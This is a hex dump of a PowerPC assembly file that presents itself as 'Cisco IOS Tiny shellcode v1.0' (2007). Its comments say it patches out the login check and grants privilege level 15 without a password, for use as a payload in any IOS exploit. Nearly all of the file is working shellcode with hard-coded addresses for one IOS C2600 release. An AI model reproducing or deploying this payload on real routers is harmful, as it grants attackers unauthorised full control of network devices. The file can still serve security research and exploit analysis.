00000000  23 20 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |# --------------|
00000010  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000050  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 0d 0a 23 0d 0a 23  |----------..#..#|
00000060  20 43 69 73 63 6f 20 49  4f 53 20 54 69 6e 79 20  | Cisco IOS Tiny |
00000070  73 68 65 6c 6c 63 6f 64  65 20 76 31 2e 30 0d 0a  |shellcode v1.0..|
00000080  23 20 28 63 29 20 32 30  30 37 20 49 52 4d 20 50  |# (c) 2007 IRM P|
00000090  6c 63 0d 0a 23 20 42 79  20 47 79 61 6e 20 43 68  |lc..# By Gyan Ch|
000000a0  61 77 64 68 61 72 79 0d  0a 23 0d 0a 23 20 2d 2d  |awdhary..#..# --|
000000b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000100  2d 2d 2d 2d 2d 2d 0d 0a  23 0d 0a 23 20 54 68 65  |------..#..# The|
00000110  20 63 6f 64 65 20 63 72  65 61 74 65 73 20 61 20  | code creates a |
00000120  6e 65 77 20 54 54 59 2c  20 61 6e 64 20 73 65 74  |new TTY, and set|
00000130  73 20 74 68 65 20 70 72  69 76 69 6c 65 67 65 20  |s the privilege |
00000140  6c 65 76 65 6c 20 74 6f  20 31 35 20 77 69 74 68  |level to 15 with|
00000150  6f 75 74 20 61 20 70 61  73 73 77 6f 72 64 0d 0a  |out a password..|
00000160  23 0d 0a 23 20 54 68 69  73 20 73 68 65 6c 6c 63  |#..# This shellc|
00000170  6f 64 65 20 63 61 6e 20  62 65 20 75 73 65 64 20  |ode can be used |
00000180  61 73 20 74 68 65 20 70  61 79 6c 6f 61 64 20 66  |as the payload f|
00000190  6f 72 20 61 6e 79 20 49  4f 53 20 65 78 70 6c 6f  |or any IOS explo|
000001a0  69 74 20 6f 6e 20 61 20  50 6f 77 65 72 50 43 2d  |it on a PowerPC-|
000001b0  62 61 73 65 64 20 64 65  76 69 63 65 2e 0d 0a 23  |based device...#|
000001c0  20 0d 0a 23 0d 0a 23 20  54 68 65 20 66 6f 6c 6c  | ..#..# The foll|
000001d0  6f 77 69 6e 67 20 74 77  6f 20 68 61 72 64 2d 63  |owing two hard-c|
000001e0  6f 64 65 64 20 61 64 64  72 65 73 73 65 73 20 6d  |oded addresses m|
000001f0  75 73 74 20 62 65 20 6c  6f 63 61 74 65 64 20 66  |ust be located f|
00000200  6f 72 20 74 68 65 20 74  61 72 67 65 74 20 49 4f  |or the target IO|
00000210  53 20 76 65 72 73 69 6f  6e 2e 20 0d 0a 23 0d 0a  |S version. ..#..|
00000220  23 20 54 68 65 20 68 61  72 64 2d 63 6f 64 65 64  |# The hard-coded|
00000230  20 61 64 64 72 65 73 73  65 73 20 75 73 65 64 20  | addresses used |
00000240  68 65 72 65 20 61 72 65  20 66 6f 72 3a 0d 0a 23  |here are for:..#|
00000250  0d 0a 23 20 49 4f 53 20  28 74 6d 29 20 43 32 36  |..# IOS (tm) C26|
00000260  30 30 20 53 6f 66 74 77  61 72 65 20 28 43 32 36  |00 Software (C26|
00000270  30 30 2d 49 4b 39 53 2d  4d 29 2c 20 56 65 72 73  |00-IK9S-M), Vers|
00000280  69 6f 6e 20 31 32 2e 33  28 32 32 29 2c 20 52 45  |ion 12.3(22), RE|
00000290  4c 45 41 53 45 20 53 4f  46 54 57 41 52 45 20 28  |LEASE SOFTWARE (|
000002a0  66 63 32 29 0d 0a 23 0d  0a 23 20 2d 2d 2d 2d 2d  |fc2)..#..# -----|
000002b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000300  2d 2d 2d 0d 0a 2e 65 71  75 20 72 65 74 2c 20 30  |---...equ ret, 0|
00000310  78 38 30 34 61 34 32 65  38 0d 0a 2e 65 71 75 20  |x804a42e8...equ |
00000320  6c 6f 67 69 6e 2c 20 30  78 38 33 35 39 62 31 66  |login, 0x8359b1f|
00000330  34 0d 0a 2e 65 71 75 20  67 6f 64 2c 20 30 78 66  |4...equ god, 0xf|
00000340  66 31 30 30 30 30 30 0d  0a 2e 65 71 75 20 70 72  |f100000...equ pr|
00000350  69 76 2c 20 30 78 38 33  35 39 62 65 36 34 0d 0a  |iv, 0x8359be64..|
00000360  23 20 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |# --------------|
00000370  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000003b0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 0d 0a 0d 0a 6d 61  |----------....ma|
000003c0  69 6e 3a 0d 0a 0d 0a 09  23 20 6c 6f 67 69 6e 20  |in:.....# login |
000003d0  70 61 74 63 68 20 62 65  67 69 6e 0d 0a 09 6c 69  |patch begin...li|
000003e0  73 20 39 2c 20 6c 6f 67  69 6e 40 68 61 0d 0a 09  |s 9, login@ha...|
000003f0  6c 61 20 39 2c 20 6c 6f  67 69 6e 40 6c 28 39 29  |la 9, login@l(9)|
00000400  0d 0a 09 6c 69 20 38 2c  30 0d 0a 09 73 74 77 20  |...li 8,0...stw |
00000410  38 2c 20 30 28 39 29 0d  0a 09 23 20 6c 6f 67 69  |8, 0(9)...# logi|
00000420  6e 20 70 61 74 63 68 20  65 6e 64 0d 0a 0d 0a 09  |n patch end.....|
00000430  23 20 70 72 69 76 20 70  61 74 63 68 20 62 65 67  |# priv patch beg|
00000440  69 6e 0d 0a 09 6c 69 73  20 39 2c 20 70 72 69 76  |in...lis 9, priv|
00000450  40 68 61 0d 0a 09 6c 61  20 39 2c 20 70 72 69 76  |@ha...la 9, priv|
00000460  40 6c 28 39 29 0d 0a 09  6c 69 73 20 38 2c 20 67  |@l(9)...lis 8, g|
00000470  6f 64 40 68 61 0d 0a 09  6c 61 20 38 2c 20 67 6f  |od@ha...la 8, go|
00000480  64 40 6c 28 38 29 0d 0a  09 73 74 77 20 38 2c 20  |d@l(8)...stw 8, |
00000490  30 28 39 29 0d 0a 09 23  20 70 72 69 76 20 70 61  |0(9)...# priv pa|
000004a0  74 63 68 20 65 6e 64 20  0d 0a 09 0d 0a 09 23 20  |tch end ......# |
000004b0  65 78 69 74 20 63 6f 64  65 0d 0a 20 20 20 20 20  |exit code..     |
000004c0  20 6c 69 73 20 20 20 20  20 31 30 2c 20 72 65 74  | lis     10, ret|
000004d0  40 68 61 0d 0a 20 20 20  20 20 20 61 64 64 69 20  |@ha..      addi |
000004e0  20 20 20 34 2c 20 31 30  2c 20 72 65 74 40 6c 0d  |   4, 10, ret@l.|
000004f0  0a 20 20 20 20 20 20 6d  74 63 74 72 20 20 20 34  |.      mtctr   4|
00000500  0d 0a 20 20 20 20 20 20  62 63 74 72 6c           |..      bctrl|
0000050d
